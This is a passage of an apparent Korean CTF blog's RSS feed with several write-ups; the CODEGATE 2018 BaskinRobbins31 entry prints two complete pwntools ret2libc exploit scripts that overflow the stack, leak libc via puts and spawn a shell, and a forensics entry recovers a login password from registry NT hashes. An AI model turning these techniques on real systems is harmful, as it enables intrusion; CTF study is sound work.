      <link>http://j0n9hyun.github.io/2019/02/15/trust1st/</link>
      <guid>http://j0n9hyun.github.io/2019/02/15/trust1st/</guid>
      <pubDate>Thu, 14 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;대회-후기&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="대회-후기"><a class="markdownIt-Anchor" href="#대회-후기"></a> 대회 후기</h2><p><img src="https://user-images.githubusercontent.com/16969364/58155281-88a24380-7cae-11e9-99af-3fd269394dce.PNG" alt="score"></p><center><small> [1등!!!] </small></center>낮 12시부터 시작해서 자정까지 총 12시간동안 진행하는 디미고 CTF 대회였다.  좀 아쉬웠던 부분이라고 하면 포너블 문제가 죄다 막혀서 하나도 못 풀었다...아직 내공이 더 필요한 거 같다.  참여한 팀원들 모두 고생했고 또 있을 대회에 상위권으로 들 수 있도록 화이팅! <br> <br>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/15/trust1st/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CODEGATE 2018 BaskinRobbins31</title>
      <link>http://j0n9hyun.github.io/2019/02/05/baskinrobbins31/</link>
      <guid>http://j0n9hyun.github.io/2019/02/05/baskinrobbins31/</guid>
      <pubDate>Tue, 05 Feb 2019 03:42:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;baskinrobbins31&quot;&gt;&lt;a class=&quot;markdo
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="baskinrobbins31"><a class="markdownIt-Anchor" href="#baskinrobbins31"></a> BaskinRobbins31</h2><center> <a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3198717/BaskinRobins31.zip" class="btn btn_info" target="_blank" rel="noopener">Binary File</a> </center><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035696-4ec52600-7b64-11e9-9d3e-76c88edd999a.PNG"><center><small>[사진 1-1]</small></center>우리가 아는 그 베라 게임이다. 하지만 일반적인 방법으로는 이길 수 없다.<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035697-4ec52600-7b64-11e9-91e6-868ea36f1568.PNG"><center><small>[사진 1-2]</small></center>필승법으로 이겨보려 하지만 치트를 쓴다.<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035698-4ec52600-7b64-11e9-8638-77b1293d1ca5.PNG"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./baskin'</span>)</span><br><span class="line">e = ELF(<span class="string">'./baskin'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">your_turn = e.symbols[<span class="string">'your_turn'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">pr = <span class="number">0x400bc3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"\x90"</span>*<span class="number">184</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(your_turn)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"...:("</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">""</span></span><br><span class="line">payload2 += <span class="string">"\x90"</span>*<span class="number">184</span></span><br><span class="line">payload2 += p64(pr)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">"(1-3)"</span>, payload2)</span><br><span class="line">r.recvlines(<span class="number">4</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./baskin'</span>)</span><br><span class="line">e = ELF(<span class="string">'./baskin'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">your_turn = e.symbols[<span class="string">'your_turn'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">pr = <span class="number">0x400bc3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> leaked</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"\x90"</span>*<span class="number">184</span></span><br><span class="line">    payload += p64(pr)</span><br><span class="line">    payload += p64(puts_got)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(your_turn)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"...:("</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> system_addr, binsh_addr</span><br><span class="line">    libc_base = leaked - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    payload2 = <span class="string">""</span></span><br><span class="line">    payload2 += <span class="string">"\x90"</span>*<span class="number">184</span></span><br><span class="line">    payload2 += p64(pr)</span><br><span class="line">    payload2 += p64(binsh_addr)</span><br><span class="line">    payload2 += p64(system_addr)</span><br><span class="line">    r.sendlineafter(<span class="string">"(1-3)"</span>, payload2)</span><br><span class="line">    r.recvlines(<span class="number">4</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    leak()</span><br><span class="line">    offset()</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code #2]</small></center><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/05/baskinrobbins31/#disqus_thread</comments>
    </item>
    
    <item>
      <title>NEWSECU CTF 2019 Easy_Forensics (1)</title>
      <link>http://j0n9hyun.github.io/2019/02/02/easy_forensics1/</link>
      <guid>http://j0n9hyun.github.io/2019/02/02/easy_forensics1/</guid>
      <pubDate>Fri, 01 Feb 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;easy_forensics-1&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="easy_forensics-1"><a class="markdownIt-Anchor" href="#easy_forensics-1"></a> Easy_Forensics (1)</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034244-1839dc00-7b61-11e9-8042-96b5a4284468.PNG"><center><small>[시작 화면]</small></center>  2.2G 용량의 윈도우7 가상머신 파일이 있다. 시작하면 로그인 화면에서 암호를 입력해야 하기 때문에 진입을 못한다.  이 암호가 무엇인지 알아내면 정답이다.  <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034245-1839dc00-7b61-11e9-9bad-d6d418808fca.PNG"> <center><small>[vmdk 파일 추출]</small></center>  그러려면 우선 vm파일을 추출하는 과정이 필요한데 FTK Imager를 이용하면 추출이 가능하다.  내용물 전부 추출할 필요는 없다 하이브 파일이 들어있는 폴더만 가져온다.  <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034246-18d27280-7b61-11e9-80ec-28daca455edc.PNG"><center><small>[Registry Analysis Tool]</small></center>  이후 레지스트리 분석 도구를 이용해 사용자 계정 정보를 확인한다.  3번째에 있는 nolja 계정에 Secret 이름이 있는 것을 보면 우리가 원하는 정보는 이것임을 알 수 있다.  계정 정보에는 NT해쉬도 같이 저장되는데 이 NT해쉬가 바로 암호를 말하는 것이다.  <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034247-18d27280-7b61-11e9-9a7a-0d5f0a003f26.PNG"><center><small>[복호화 성공!]</small></center>   암호를 입력하면 환영합니다 메세지를 볼 수 있을 것이다.  <blockquote> <p><cite>flag{st4rt}</cite></p> </blockquote> <style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/02/02/easy_forensics1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>NEWSECU CTF 2019 Secret_code_from</title>
      <link>http://j0n9hyun.github.io/2019/01/31/secret_code_from/</link>
      <guid>http://j0n9hyun.github.io/2019/01/31/secret_code_from/</guid>
      <pubDate>Thu, 31 Jan 2019 11:27:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;secret_code_from&quot;&gt;&lt;a class=&quot;markd
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="secret_code_from"><a class="markdownIt-Anchor" href="#secret_code_from"></a> Secret_code_from</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035323-79fb4580-7b63-11e9-98b8-c19513198bc9.PNG"><center><small>[워드 파일]</small></center>워드 파일이 하나 주어진다. 열어보면 무언가 써있는데 축소해서 보면 확인할 수 있다.  보는 시야를 달리하면 쉽게 풀 수 있었던 문제!  <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035325-79fb4580-7b63-11e9-84ab-9b8b0795d435.PNG"><blockquote> <p><cite>flag{can_you_see_me?}</cite></p> </blockquote><style>img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/01/31/secret_code_from/#disqus_thread</comments>
    </item>
    
    <item>
      <title>NEWSECU CTF 2019 선물문제</title>
      <link>http://j0n9hyun.github.io/2019/01/30/present/</link>
      <guid>http://j0n9hyun.github.io/2019/01/30/present/</guid>
      <pubDate>Wed, 30 Jan 2019 14:10:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;선물문제저놈-잡아라&quot;&gt;&lt;a class=&quot;markdownIt-
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="선물문제저놈-잡아라"><a class="markdownIt-Anchor" href="#선물문제저놈-잡아라"></a> 선물문제(저놈 잡아라)</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035139-140ebe00-7b63-11e9-8bcf-9d397dec6bfa.jpg"><center><small>[문제 이미지]</small></center>해당 사진을 보고 버스번호와 건물명을 맞추는 문제이다.  버스 노선 검색 결과, 급행버스이고 남양주시 -> 강남역(종착)을 향하는 버스번호는 1700 하나뿐이다.  헤맨 이유는 도로명 때문이었는데 이것 때문에 손 브루트포싱(?)을 좀 많이 했다. '점X밀X노'인 줄 알고 계속 넣었는데 안 되길래 다시 검색해본 결과, 다른 건물이었다(...)   <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58035140-14a75480-7b63-11e9-86a3-a728753afb1d.png"><center><small>[길찾기 서비스로 확인한 결과]</small></center>건물이름 하고 우측에도 흰 공백이 더 있더라니 '점X밀X노'는 함정이었다. 이런!  <small>Flag : SPAO_1700</small><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/01/30/present/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
